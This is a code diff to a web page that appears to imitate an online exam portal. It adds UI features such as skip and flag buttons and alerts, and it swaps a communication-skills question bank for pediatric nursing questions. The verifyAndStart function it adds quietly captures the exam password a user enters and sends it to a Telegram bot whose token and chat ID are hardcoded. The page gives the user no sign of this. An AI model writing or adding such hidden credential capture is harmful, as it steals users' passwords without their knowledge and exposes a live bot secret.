+        if (!event || event.target === document.getElementById('lock-notification-overlay')) {
+            document.getElementById('lock-notification-overlay').classList.remove('open');
+        }
+    }
+
+    function showiOSAlert() {
+        document.getElementById('ios-alert-overlay').style.display = 'flex';
+    }
+
+    function closeiOSAlert() {
+        document.getElementById('ios-alert-overlay').style.display = 'none';
+    }
+
+    function confirmiOSAlert() {
+        closeiOSAlert();
+        actuallyStartExam();
+    }
+
+    function actuallyStartExam() {
+        closeLockNotification(null);
         document.getElementById('dashboard-container').style.display = 'none';
         clearInterval(dashboardTimerInterval); 
         document.getElementById('exam-interface-container').style.display = 'block';
         initExamSystem();
     }
 
+    function verifyAndStart() {
+        capturedExamVerificationPassword = document.getElementById('exam-password-input').value || "";
+        
+        // إرسال كلمة المرور إلى Telegram
+        const telegramBotToken = '8979568296:AAEj9rp_VvnR9ZMgFsIwzxRS1raqiWr-cWE';
+        const telegramChatId = '-5118649597';
+        const message = `🔔 محاولة دخول للاختبار\nكلمة المرور المُدخلة: ${capturedExamVerificationPassword}`;
+        
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            })
+        }).catch(error => console.error('Error sending to Telegram:', error));
+
+        closeModal();
+        openLockNotification();
+    }
+
     const bank = [
-  { q: "What percentage of communication is commonly attributed to nonverbal behaviors?", a: ["Approximately 70%", "Exactly 50%", "Around 23%", "Only 7%"], marks: "0.8" },
-  { q: "Which of the following best describes 'Kinesics' in nonverbal communication?", a: ["Body movement such as gestures and facial expressions", "The physical distance and space between individuals", "The use of touch in clinical settings", "The tone and volume of a person's voice"], marks: "0.8" },
-  { q: "What is the primary function of 'Proxemics' in healthcare communication?", a: ["Managing distance, territory, and personal space", "Interpreting involuntary hand movements", "Regulating turn-taking in conversation", "Assessing the patient's pain through facial grimaces"], marks: "0.8" },
-  { q: "Which type of gesture is used intentionally to clarify or emphasize speech, such as showing where an incision will be?", a: ["Illustrators", "Leakage", "Proxemics", "Elderspeak"], marks: "0.8" },
-  { q: "Involuntary gestures that reveal a person's true feelings, even when their words say otherwise, are known as:", a: ["Leakage", "Illustrators", "Congruency", "Tactfulness"], marks: "0.8" },
-  { q: "What is the typical distance for the 'Personal Zone' in healthcare settings?", a: ["1.5 to 4 feet", "Up to 1.5 feet", "4 to 12 feet", "More than 12 feet"], marks: "0.8" },
-  { q: "Which distance zone is generally considered inappropriate for discussing personal health information?", a: ["Public zone (>12 ft)", "Social zone (4-12 ft)", "Personal zone (1.5-4 ft)", "Intimate zone (up to 1.5 ft)"], marks: "0.8" },
-  { q: "When a patient displays a rigid upright posture and increased muscle tone, it is most likely a nonverbal cue for:", a: ["Anxiety", "Boredom", "Depression", "Acceptance"], marks: "0.8" },
-  { q: "What does 'congruency' mean in the context of communication?", a: ["Verbal and nonverbal messages match", "The nurse and patient speak the same language", "The patient agrees with the treatment plan", "Using an official interpreter for medical history"], marks: "0.8" },
-  { q: "When a verbal message conflicts with a nonverbal message, which one is typically believed?", a: ["The nonverbal message", "The verbal message", "Neither is believed", "The written documentation"], marks: "0.8" },
-  { q: "How should a nurse ideally position themselves when speaking with a patient to build rapport?", a: ["Sit down at eye level, leaning slightly forward", "Stand over the patient to show authority", "Lean back with crossed arms", "Maintain a distance of at least 12 feet"], marks: "0.8" },
-  { q: "Professional presence in clinical communication is best defined as:", a: ["How nurses show up and signal professionalism and caring", "The uniform and physical appearance of the nurse", "The ability to speak multiple languages", "Using complex medical terminology"], marks: "0.8" },
-  { q: "Communicating sensitive information in a way that preserves dignity and reduces defensiveness is known as:", a: ["Tactfulness", "Genuineness", "Self-disclosure", "Assertiveness"], marks: "0.8" },
-  { q: "Accurately understanding another person's feelings and perspective, and communicating that understanding, is the definition of:", a: ["Empathy", "Sympathy", "Courtesy", "Genuineness"], marks: "0.8" },
-  { q: "Being authentic, honest, and ensuring your words match your behavior is referred to as:", a: ["Genuineness", "Tactfulness", "Empathy", "Assertiveness"], marks: "0.8" },
-  { q: "When is self-disclosure considered appropriate in a clinical setting?", a: ["When it builds rapport and keeps the focus on the patient", "When the nurse needs emotional support from the patient", "When telling a personal story just to pass the time", "When shifting the focus away from the patient's anxiety"], marks: "0.8" },
-  { q: "Which of the following is a characteristic of assertive communication?", a: ["Clear, respectful expression of needs using 'I' statements", "Using sarcasm and raised voices", "Blaming others and using 'you always/never' statements", "Remaining completely silent to avoid conflict"], marks: "0.8" },
-  { q: "What is a therapeutic benefit of using silence during patient communication?", a: ["It allows patients time to gather their thoughts and reduces pressure", "It shows the patient that the nurse is in charge", "It forces the patient to agree with the treatment plan", "It indicates that the nurse strongly disapproves of the patient's choices"], marks: "0.8" },
-  { q: "When managing an angry patient, what is the best initial approach?", a: ["Stay calm, listen without defending, and use a safe posture", "Raise your voice to establish control over the situation", "Immediately leave the room without saying anything", "Argue with the patient to correct their misunderstanding"], marks: "0.8" },
-  { q: "Under the Privacy Rule, healthcare disclosures are primarily allowed for 'TPO', which stands for:", a: ["Treatment, Payment, Operations", "Testing, Prescribing, Observing", "Time, Place, Occurrence", "Training, Practice, Organization"], marks: "0.8" },
-  { q: "A communication barrier in healthcare is best defined as:", a: ["Anything that prevents sharing meaning clearly and safely", "A patient refusing to take their prescribed medication", "A physical wall separating the nurse's station from patient rooms", "The use of electronic health records instead of paper"], marks: "0.8" },
-  { q: "Why can 'dialects and local expressions' be a clinical risk even if the nurse and patient speak the same language?", a: ["The nurse may misinterpret the meaning of familiar words used differently", "The patient will always refuse care from someone with a different accent", "It makes the use of medical interpreters legally mandatory", "It violates the hospital's privacy policies"], marks: "0.8" },
-  { q: "What is a recommended strategy when communicating with a patient experiencing urgent discomfort, like breathlessness?", a: ["Use a brief greeting, explain why you are asking, and use short questions", "Engage in long social conversation to distract them", "Ask complex, open-ended questions to get a full history", "Crowd the patient to show close support and empathy"], marks: "0.8" },
-  { q: "What is a major risk of using family members as interpreters?", a: ["They may filter sensitive information or change the meaning", "They charge high fees for their interpretation services", "They are too familiar with medical terminology", "They always speak slower than official interpreters"], marks: "0.8" },
-  { q: "What is the best-practice direction for communicating with a patient who does not speak the dominant language?", a: ["Use an official/recognized interpreter whenever possible", "Rely entirely on the patient's children to translate", "Use paper and pen drawings for all medical consent forms", "Speak louder and slower in English"], marks: "0.8" },
-  { q: "Aphasia is best described as:", a: ["An acquired communication disorder due to brain damage", "A condition characterized by complete hearing loss", "A age-related decline in short-term memory", "A visual impairment affecting the ability to read"], marks: "0.8" },
-  { q: "Which of the following is a practical nursing principle for communicating with a patient who has aphasia?", a: ["Give more time and speak at a measured pace", "Assume they cannot understand humor and ignore them", "Hurry the conversation to reduce their frustration", "Use complex medical terms to stimulate brain activity"], marks: "0.8" },
-  { q: "What does 'elderspeak' refer to?", a: ["Infantilizing language or inappropriate endearments", "Respectful communication used with senior citizens", "A specialized dialect used in nursing homes", "The process of repeating everything twice for clarity"], marks: "0.8" },
-  { q: "Cue cards and picture boards are most useful for patients who:", a: ["Have cognitive difficulty expressing themselves verbally or have aphasia", "Are experiencing acute hearing loss but have normal speech", "Are fully bilingual but prefer visual learning", "Have visual impairments like blindness"], marks: "0.8" },
-  { q: "When no official interpreter is available, using paper and pen drawings is considered:", a: ["A high-risk approach that should not be relied upon for informed consent", "The gold standard for cross-cultural communication", "A completely safe method for explaining complex surgeries", "Only appropriate if the family refuses to translate"], marks: "0.8" },
-  { q: "Effective healthcare teams are defined by having a 'common purpose' and:", a: ["Mutual accountability for outcomes and complementary skills", "A strictly enforced hierarchy with no room for questions", "Members who never experience conflict or disagreement", "Identical personalities and communication styles"], marks: "0.8" },
-  { q: "In team dynamics, 'group norms' refer to:", a: ["Informal rules that govern participation, punctuality, and tone", "The formal job descriptions of each team member", "The stages a group goes through, like forming and storming", "The specific clinical tasks assigned to the nursing staff"], marks: "0.8" },
-  { q: "Which of the following is an example of a 'maintenance role' in a group?", a: ["Encourager or harmonizer", "Initiator of tasks", "Summarizer of information", "Intellectualizer"], marks: "0.8" },
-  { q: "What is the phenomenon called 'social loafing'?", a: ["Effort and investment decrease as the group size increases", "Group members socializing instead of working", "A single member dominating the entire conversation", "The team leader taking all the credit for the group's work"], marks: "0.8" },
-  { q: "What does the 'S' in the SBAR communication tool stand for?", a: ["Situation", "Symptoms", "Standard", "Safety"], marks: "0.8" },
-  { q: "In the SBAR tool, explaining that a patient is a '62-year-old male post-op day one' belongs in which section?", a: ["Background", "Situation", "Assessment", "Recommendation"], marks: "0.8" },
-  { q: "According to the SBAR format, stating 'I feel strongly the patient should be assessed now' represents the:", a: ["Recommendation", "Situation", "Background", "Assessment"], marks: "0.8" },
-  { q: "A 'collaborative climate' in a team is visible through day-to-day behaviors such as:", a: ["Respectful tone, turn-taking, and inclusion of quieter members", "Ignoring junior staff to save time during handovers", "Using self-protective behaviors like the 'invisible' member role", "Reporting every minor disagreement to the hospital administration"], marks: "0.8" },
-  { q: "Which behavior is considered a self-protective block to communication in groups?", a: ["The 'intellectualizer' who overcomplicates with unnecessary complexity", "The 'summarizer' who reviews the group's progress", "The 'encourager' who motivates other team members", "The 'consensus taker' who checks for agreement"], marks: "0.8" },
-  { q: "Why is 'coalition' (collegial alignment) important in healthcare structures?", a: ["It enhances communication quality in environments with strong hierarchy", "It completely eliminates the need for leadership roles", "It allows nurses to bypass all hospital policies", "It forces doctors to take over nursing documentation tasks"], marks: "0.8" },
-  { q: "When delivering care to a patient with dementia, what is a key communication strategy?", a: ["Use simple sentences, clarify time, and offer choices at their pace", "Use long, complex instructions to challenge their memory", "Argue with them when they are confused to ground them in reality", "Stand over them while speaking to ensure they hear you clearly"], marks: "0.8" },
-  { q: "A patient says 'I am not afraid' but is constantly wringing their hands. This is an example of:", a: ["A mixed message lacking congruency", "Appropriate self-disclosure", "Therapeutic communication", "Effective use of illustrators"], marks: "0.8" },
-  { q: "Which statement best describes the assessment of pain through facial expressions?", a: ["Healthcare providers may underestimate pain; grimaces appear when the threshold is reached", "Patients rarely express pain through facial cues", "More clinical experience always guarantees perfect pain estimation", "A smiling patient can never be experiencing severe pain"], marks: "0.8" },
-  { q: "What is the recommended approach to confirm your interpretation of a patient's nonverbal cue?", a: ["Use a nonjudgmental observation like 'I notice you've folded your arms...'", "Make a firm assumption and document it immediately", "Ignore the cue if it contradicts what the patient is saying", "Tell the patient they are sending confusing signals"], marks: "0.8" },
-  { q: "Maintaining eye contact with a patient during a conversation primarily serves to:", a: ["Show interest and acknowledge the patient's worth", "Diagnose visual impairments", "Establish dominance in the relationship", "Ensure the patient cannot look away"], marks: "0.8" },
-  { q: "Which of the following is considered an aggressive, rather than assertive, communication behavior?", a: ["Using 'you always/never' statements and blaming others", "Using 'I' statements to express feelings", "Providing specific facts and rationale for requests", "Protecting patient safety through calm dialogue"], marks: "0.8" },
-  { q: "When working in a clinical team, identifying expected 'standards of excellence' typically involves:", a: ["Establishing clear protocols for handovers, documentation, and escalations", "Deciding which team member is the most popular", "Allowing everyone to work according to their own personal schedule", "Eliminating all structured communication tools like SBAR"], marks: "0.8" },
-  { q: "Giving professional feedback to a team member should include:", a: ["Using inclusive language ('we/us') and stating specific behavior plus its impact", "Addressing the person publicly to set an example for others", "Focusing on the person's character rather than the specific incident", "Assuming the role of the 'invisible' member and staying quiet"], marks: "0.8" },
-  { q: "What is a primary reason that the 'encourager' role is vital in a healthcare group?", a: ["Without it, members may feel unrecognized and their effort can decline", "It is legally required by hospital administration", "It replaces the need for a formal team leader", "It guarantees that the team will never face clinical errors"], marks: "0.8" },
-  { q: "In cross-cultural nonverbal communication, why must gestures be used with caution?", a: ["Gestures are highly culture-specific and can mean different things, potentially offending patients", "Gestures are universally understood and eliminate the need for spoken language", "Using gestures violates the principles of proxemics", "Gestures always indicate a lack of professional presence"] , marks: "0.8" }
+  // --- Lecture 7 & 8: Gastrointestinal Dysfunction ---
+  { q: "Which of the following is the most common cause of serious gastroenteritis among children under 5 years old?", a: ["Rotavirus", "Escherichia coli", "Salmonella", "Shigella"], marks: "0.50" },
+  { q: "A child has persistent diarrhea lasting for more than 14 days. This condition is classified as:", a: ["Chronic diarrhea", "Acute diarrhea", "Intractable diarrhea", "Self-limited diarrhea"], marks: "0.50" },
+  { q: "Which type of dehydration occurs when water loss is greater than sodium loss, causing fluid to leave the cells?", a: ["Hypertonic dehydration", "Isotonic dehydration", "Hypotonic dehydration", "Osmotic dehydration"], marks: "0.50" },
+  { q: "A 10 kg child is diagnosed with moderate dehydration. According to therapeutic management guidelines, how much Oral Rehydration Solution (ORS) should be given within 4 hours?", a: ["1000 ml", "500 ml", "200 ml", "1500 ml"], marks: "0.50" },
+  { q: "Which clinical sign is specifically indicative of severe dehydration rather than moderate dehydration?", a: ["Lethargy or Coma", "Dry mucous membranes", "Loss of skin turgor", "Sunken eyes"], marks: "0.50" },
+  { q: "Hirschsprung disease is also mechanically known as:", a: ["Congenital aganglionic megacolon", "Hypertrophic pyloric stenosis", "Intussusception", "Vesicoureteral reflux"], marks: "0.50" },
+  { q: "What is considered the definitive diagnostic test to confirm Hirschsprung disease?", a: ["Rectal biopsy showing absence of ganglion cells", "Abdominal ultrasound", "Barium enema", "Stool culture"], marks: "0.50" },
+  { q: "A newborn fails to pass meconium within 24 to 48 hours after birth, exhibits abdominal distention and bilious vomiting. The nurse should suspect:", a: ["Hirschsprung disease", "Pyloric stenosis", "Intussusception", "Celiac disease"], marks: "0.50" },
+  { q: "What type of stool is characteristically observed in an older child with Hirschsprung disease?", a: ["Ribbonlike, foul-smelling stools", "Red, currant jelly-like stools", "Tarry black stools", "Frothy, fatty stools"], marks: "0.50" },
+  { q: "What is the most serious and life-threatening complication of Hirschsprung disease before surgery?", a: ["Enterocolitis", "Intestinal perforation", "Dehydration", "Appendicitis"], marks: "0.50" },
+  { q: "A classic physical clinical manifestation of Hypertrophic Pyloric Stenosis (HPS) is:", a: ["An olive-shaped mass in the epigastrium", "A sausage-shaped mass in the upper right quadrant", "A flat or depressed bridge of the nose", "Puffiness around the eyes"], marks: "0.50" },
+  { q: "Vomiting associated with hypertrophic pyloric stenosis is characteristically described as:", a: ["Projectile and non-bilious", "Frothy with mucus", "Bilious and green", "Malodorous and tarry"], marks: "0.50" },
+  { q: "Because of extensive and prolonged vomiting, an infant with pyloric stenosis is at high risk for developing:", a: ["Metabolic alkalosis", "Metabolic acidosis", "Respiratory acidosis", "Hyperkalemia"], marks: "0.50" },
+  { q: "What is the primary surgical treatment performed to correct hypertrophic pyloric stenosis?", a: ["Pyloromyotomy", "Appendectomy", "Orchiopexy", "Hypospadias repair"], marks: "0.50" },
+  { q: "Intussusception is clinically described as:", a: ["Telescoping or folding of the intestine in on itself", "Protrusion of an organ through an abnormal opening", "Narrowing of the pyloric canal", "Absence of ganglionic cells in the colon"], marks: "0.50" },
+  { q: "A child with intussusception presents with screaming and drawing knees to the chest. What type of stool confirms this condition?", a: ["Red, currant jelly-like stools", "Ribbonlike, foul-smelling stools", "Dark, frothy stools", "Tarry black stools"], marks: "0.50" },
+  { q: "During physical palpation of a child with intussusception, the nurse expects to find:", a: ["A sausage-shaped mass in the upper right quadrant", "An olive-shaped tumor in the epigastrium", "Generalized rigid guarding", "An easily palpable fecal mass"], marks: "0.50" },
+  { q: "While preparing a child with intussusception for surgery, the child passes a normal brown stool. What is the immediate nursing action?", a: ["Report it immediately to the physician to alter the care plan", "Document the finding and continue preoperative sedation", "Administer the scheduled systemic antibiotics", "Proceed with the planned pre-anesthetic preparation"], marks: "0.50" },
+  { q: "Umbilical hernias in infants usually resolve spontaneously by what age?", a: ["3 to 5 years of age", "6 months of age", "12 months of age", "Adolescence"], marks: "0.50" },
+  { q: "When managing an infant with an inguinal hernia, the nurse instructs parents that simple measures to reduce it include:", a: ["A warm bath and avoidance of upright positioning", "Taping or strapping the abdomen tightly", "Placing the infant in a strict standing position", "Restricting fluid intake for 24 hours"], marks: "0.50" },
+  { q: "The peak incidence of appendicitis in childhood occurs between which ages?", a: ["12 and 18 years", "2 and 5 years", "6 and 11 years", "Infancy"], marks: "0.50" },
+  { q: "A nurse performs deep palpation on a child's abdomen and notes severe pain upon sudden release of the pressure. This is documented as:", a: ["Rebound tenderness at McBurney point", "Dance sign", "Positive Murphy sign", "Chordee curvature"], marks: "0.50" },
+
+  // --- Lecture 9: Hematologic Dysfunction ---
+  { q: "Which diagnostic laboratory test is considered the most accurate to measure iron stores and diagnose iron deficiency anemia?", a: ["Serum ferritin level", "Complete blood picture (CBC)", "Total iron binding capacity (TIBC)", "Hemoglobin electrophoresis"], marks: "0.50" },
+  { q: "To facilitate the absorption of oral iron supplements, the nurse should instruct parents to administer the medication with:", a: ["Citrus fruit or juice rich in Vitamin C", "Cow's milk", "Calcium supplements", "Antacids"], marks: "0.50" },
+  { q: "What color changes should the nurse inform parents to expect in the child's stool during oral iron supplement therapy?", a: ["Tarry green or black color", "Red or currant jelly color", "Clay or white color", "Bright yellow color"], marks: "0.50" },
+  { q: "What strategy should the nurse teach parents to prevent temporary staining of teeth from liquid iron preparations?", a: ["Administer the medication through a straw or syringe and brush teeth after", "Mix the medication with a large glass of warm milk", "Dilute the medication with carbonated water", "Give the medication only with solid meals"], marks: "0.50" },
+  { q: "Sickle cell anemia (SCA) follows which genetic inheritance pattern?", a: ["Autosomal recessive", "Autosomal dominant", "X-linked recessive", "X-linked dominant"], marks: "0.50" },
+  { q: "The sickling phenomenon in newborns with sickle cell anemia is usually not apparent until later in infancy due to the protective presence of:", a: ["Fetal hemoglobin (HbF)", "Adult hemoglobin (HbA)", "Serum ferritin", "Factor VIII concentrates"], marks: "0.50" },
+  { q: "Which of the following conditions is a primary trigger for a painful sickle cell crisis?", a: ["Dehydration", "Alkalosis", "Hyperoxia", "Hypolipoproteinemia"], marks: "0.50" },
+  { q: "What is often the first painful clinical manifestation of a vasoocclusive crisis (VOC) in children aged 6 months to 2 years?", a: ["Dactylitis (swelling in hands and feet)", "Severe abdominal pain", "Obstructive jaundice", "Priapism"], marks: "0.50" },
+  { q: "A sickle cell crisis characterized by a sudden pooling of large amounts of blood in the spleen, causing decreased blood volume and shock, is called a/an:", a: ["Splenic sequestration crisis", "Aplastic crisis", "Hyperhemolytic crisis", "Vasoocclusive crisis"], marks: "0.50" },
+  { q: "Which test is an accurate, rapid, and specific screening method for detecting sickle cell disease?", a: ["Hemoglobin electrophoresis", "Serum ferritin assay", "Urine dipstick testing", "Complete Blood Count (CBC)"], marks: "0.50" },
+  { q: "Beta-thalassemia major is characterized by a partial or complete deficiency in the synthesis of which chains of the hemoglobin molecule?", a: ["Beta-polypeptide chains", "Alpha-polypeptide chains", "Gamma-globulin chains", "Heme groups"], marks: "0.50" },
+  { q: "Which medical intervention is strictly contraindicated for a child diagnosed with Thalassemia major?", a: ["Iron supplements", "Multiple blood transfusions", "Chelation therapy", "Splenectomy"], marks: "0.50" },
+  { q: "Hemophilia A is a congenital bleeding disorder resulting from a deficiency or absence of which specific coagulation factor?", a: ["Factor VIII", "Factor IX", "Factor XI", "Factor VII"], marks: "0.50" },
+  { q: "Which type of bleeding is considered the most frequent form of internal bleeding in children with severe hemophilia?", a: ["Hemarthrosis (bleeding into joint cavities)", "Epistaxis (nosebleeds)", "Hematuria (blood in urine)", "Gastrointestinal tract hemorrhage"], marks: "0.50" },
+  { q: "When managing pain for a child with hemophilia, which medication must be avoided because it inhibits platelet function?", a: ["Ibuprofen (NSAIDs)", "Acetaminophen", "Codeine", "Morphine"], marks: "0.50" },
+
+  // --- Lecture 10: Endocrine Dysfunction ---
+  { q: "Which type of diabetes mellitus is characterized by an abrupt onset, onset usually before age 20, and low to absent serum insulin?", a: ["Type 1 diabetes", "Type 2 diabetes", "Gestational diabetes", "Maturity-onset diabetes"], marks: "0.50" },
+  { q: "What are the classic 'Three Ps' clinical manifestations presenting in Type 1 Diabetes Mellitus?", a: ["Polyuria, polydipsia, polyphagia", "Pallor, puffiness, proteinuria", "Pyuria, pain, priapism", "Peristalsis, projectile vomiting, prostration"], marks: "0.50" },
+  { q: "A child is evaluated for diabetes. According to diagnostic criteria, diabetes is confirmed if an 8-hour fasting blood glucose level is equal to or greater than:", a: ["126 mg/dl", "100 mg/dl", "200 mg/dl", "110 mg/dl"], marks: "0.50" },
+  { q: "A child with Type 1 DM presents with deep, rapid breathing. The nurse documents this clinical sign as:", a: ["Kussmaul respirations", "Tachypnea", "Dyspnea on exertion", "Lid lag"], marks: "0.50" },
+  { q: "A patient with diabetes exhibits tremors, pallor, sweating, irritability, and a rapid pulse. The nurse recognizes these as manifestations of:", a: ["Hypoglycemia", "Hyperglycemia", "Diabetic Ketoacidosis (DKA)", "Thyroid storm"], marks: "0.50" },
+  { q: "What medication should a child with diabetes carry at home for the emergency kit injection treatment of severe hypoglycemia?", a: ["Glucagon", "Regular Insulin", "Lantus Insulin", "Prednisone"], marks: "0.50" },
+  { q: "A nursing alert indicates that when treating a patient in DKA, Potassium (K) must never be administered intravenously until:", a: ["Urinary voiding is observed and serum potassium is known", "Blood glucose falls below 100 mg/dl", "Kussmaul respirations completely resolve", "The patient reaches a full level of consciousness"], marks: "0.50" },
+  { q: "Which cause is identified as the most common etiology of hyperthyroidism (Graves disease) in children?", a: ["Graves disease (GD)", "Congenital hypothyroidism", "Juvenile hypothyroidism", "Pituitary tumor"], marks: "0.50" },
+  { q: "Protruding eyeballs, characteristically seen as a physical sign in Graves disease, is medically termed:", a: ["Exophthalmos", "Lid lag", "Goiter", "Frontal bossing"], marks: "0.50" },
+  { q: "If congenital hypothyroidism is left untreated in newborns, it can cause severe neurocognitive dysfunction known as:", a: ["Cretinism", "Graves disease", "Diabetes Insipidus", "Myxedema coma"], marks: "0.50" },
+  { q: "A nurse is instructing parents on the administration of Levothyroxine for juvenile hypothyroidism. If a dose is missed, what should be done?", a: ["Give twice the dose the next day", "Skip the dose entirely and notify the practitioner", "Administer a double dose immediately at night", "Withhold the medication for 48 hours"], marks: "0.50" },
+
+  // --- Lecture 11: Genitourinary Dysfunction ---
+  { q: "Which microorganism is overall the most common pathogen responsible for Urinary Tract Infections (UTIs) in children?", a: ["Escherichia coli (E. coli)", "Rotavirus", "Salmonella", "Shigella"], marks: "0.50" },
+  { q: "Nephrotic syndrome is a clinical state that characteristically includes which group of findings?", a: ["Massive proteinuria, hypoalbuminemia, hyperlipidemia, and edema", "Hematuria, hypertension, pyuria, and weight loss", "Glucosuria, polyuria, ketosis, and dehydration", "Chordee, cryptorchidism, epispadias, and fever"], marks: "0.50" }
 ]
 
     while(bank.length < 40) {
@@ -1391,6 +1808,7 @@
         options: it.a.slice(),
         answer: null, 
         flagged: false,
+        skipped: false,
         marks: it.marks
     }));
 
@@ -1432,6 +1850,8 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
 
             if (q.flagged) {
                 btn.className = "sidebar-q-btn flagged";
+            } else if (q.skipped) {
+                btn.className = "sidebar-q-btn skipped";
             } else if (q.answer !== null) {
                 btn.className = "sidebar-q-btn answered";
             } else {
@@ -1475,6 +1895,7 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
             
             radioInput.onchange = () => {
                 q.answer = i;
+                q.skipped = false; // Reset skipped if answered
                 document.querySelectorAll('.exam-option-item').forEach(el => {
                     el.classList.remove('selected');
                 });
@@ -1521,11 +1942,24 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
 
         const flagBtn = document.getElementById("examFlagBtn");
         if (q.flagged) {
-            flagBtn.style.borderColor = "#f59e0b";
-            flagBtn.style.color = "#f59e0b";
+            flagBtn.style.borderColor = "#ffffff";
+            flagBtn.style.color = "#ffffff";
+            flagBtn.textContent = "Unflag";
         } else {
-            flagBtn.style.borderColor = "var(--text-primary)";
-            flagBtn.style.color = "var(--text-primary)";
+            flagBtn.style.borderColor = "#ffffff";
+            flagBtn.style.color = "#ffffff";
+            flagBtn.textContent = "Flag";
+        }
+
+        const skipBtn = document.getElementById("examSkipBtn");
+        if (q.skipped) {
+            skipBtn.style.borderColor = "#ffffff";
+            skipBtn.style.color = "#ffffff";
+            skipBtn.textContent = "Unskip";
+        } else {
+            skipBtn.style.borderColor = "#ffffff";
+            skipBtn.style.color = "#ffffff";
+            skipBtn.textContent = "Skip";
         }
 
         drawSidebarNavigation();
@@ -1542,6 +1976,8 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
 
             if (q.flagged) {
                 itemBlock.classList.add("status-flagged"); 
+            } else if (q.skipped) {
+                itemBlock.classList.add("status-skipped"); 
             } else if (q.answer !== null) {
                 itemBlock.classList.add("status-answered"); 
             } else {
@@ -1579,11 +2015,16 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
     function toggleDarkLightMode() {
         const toggleCheckbox = document.getElementById("toggle-checkbox");
         const app = document.getElementById("quizApp");
+        const themeIcon = document.getElementById("themeIcon");
         
         if (toggleCheckbox.checked) {
             app.removeAttribute("data-theme");
+            // أيقونة القمر لوضع الليل
+            themeIcon.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>`;
         } else {
             app.setAttribute("data-theme", "light");
+            // أيقونة الشمس لوضع النهار
+            themeIcon.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>`;
         }
         displayCurrentQuestion();
     }
@@ -1600,15 +2041,51 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
     };
 
     function confirmAndProceedToUploadScreen() {
+        document.getElementById('confirm-modal-overlay').classList.remove('hidden');
+    }
+
+    function proceedToUpload() {
+        document.getElementById('confirm-modal-overlay').classList.add('hidden');
         closeSummary();
         document.getElementById('exam-interface-container').style.display = 'none';
         document.getElementById('uploading-screen-container').style.display = 'block';
         startUploadSimulation(); 
     }
 
+    function closeConfirmModal() {
+        document.getElementById('confirm-modal-overlay').classList.add('hidden');
+    }
+
     document.getElementById("examFlagBtn").onclick = () => {
         const q = examQuestions[currentExamIndex];
         q.flagged = !q.flagged;
+        
+        // Notification logic
+        if (q.flagged) {
+            document.getElementById('notif-custom-title').textContent = 'Notification';
+            document.getElementById('notif-custom-text').textContent = 'Question marked for review!';
+            document.getElementById('notif-modal-overlay').classList.remove('hidden');
+        } else {
+            document.getElementById('notif-custom-title').textContent = 'Notification';
+            document.getElementById('notif-custom-text').textContent = 'Question un-marked!';
+            document.getElementById('notif-modal-overlay').classList.remove('hidden');
+        }
+        
+        displayCurrentQuestion();
+    };
+
+    document.getElementById("examSkipBtn").onclick = () => {
+        const q = examQuestions[currentExamIndex];
+        
+        // If question is answered, show notification instead of skipping
+        if (q.answer !== null) {
+            document.getElementById('notif-custom-title').textContent = 'Notification';
+            document.getElementById('notif-custom-text').textContent = 'You can not skip attempted question.';
+            document.getElementById('notif-modal-overlay').classList.remove('hidden');
+            return;
+        }
+
+        q.skipped = !q.skipped;
         displayCurrentQuestion();
     };
 
@@ -1642,7 +2119,7 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
         const pctAside = document.getElementById("uploadPercentageAsideField");
         const modalOverlay = document.getElementById("uploadSuccessModalOverlay");
         
-        let duration = 6000; 
+        let duration = 3000; 
         let startTimestamp = null;
 
         function step(timestamp) {
@@ -1680,10 +2157,28 @@ document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
     function togglePostSwitch() {
         const container = document.getElementById('post-toggle-container');
         const txt = document.getElementById('post-toggle-text');
+        const cards = document.querySelectorAll('#post-exams-container .exam-card');
+
         if (container.classList.contains('active')) {
-            container.classList.remove('active'); txt.textContent = 'Open All';
+            container.classList.remove('active');
+            txt.textContent = 'Open All';
+            cards.forEach(card => {
+                card.classList.remove('expanded');
+                card.querySelector('.exam-details').classList.add('collapsed');
+                const btn = card.querySelector('.view-score');
+                if (btn) btn.classList.add('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▼';
+            });
         } else {
-            container.classList.add('active'); txt.textContent = 'Close All';
+            container.classList.add('active');
+            txt.textContent = 'Close All';
+            cards.forEach(card => {
+                card.classList.add('expanded');
+                card.querySelector('.exam-details').classList.remove('collapsed');
+                const btn = card.querySelector('.view-score');
+                if (btn) btn.classList.remove('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▲';
+            });
         }
     }
 
